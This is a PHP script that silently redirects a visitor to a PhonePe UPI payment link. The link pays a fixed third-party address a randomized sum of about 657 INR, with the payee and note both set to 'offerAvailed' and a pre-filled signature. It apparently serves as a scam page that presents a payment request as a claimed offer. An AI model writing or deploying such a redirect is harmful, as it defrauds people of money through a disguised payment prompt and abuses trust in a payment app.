<?php
// Generate a random amount between 657.00 and 657.99 with two decimal places
$min_amount = 657.00;
$max_amount = 657.99;
$random_amount = number_format(mt_rand($min_amount * 100, $max_amount * 100) / 100, 2);

// URL components
$base_url = "phonepe://pay";
$params = [
    "pa" => "fcbizuswuzb@freecharge",
    "tn" => "offerAvailed",
    "am" => $random_amount,
    "pn" => "OfferAvailed",
    "mode" => "02",
    "mc" => "8999",
    "purpose" => "00",
    "orgid" => "159024",
    "cu" => "INR",
    "sign" => "AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr"
];

// Build the URL
$query_string = http_build_query($params);
$full_url = $base_url . '?' . $query_string;

// Redirect to the generated URL
header("Location: $full_url");
exit;
?>
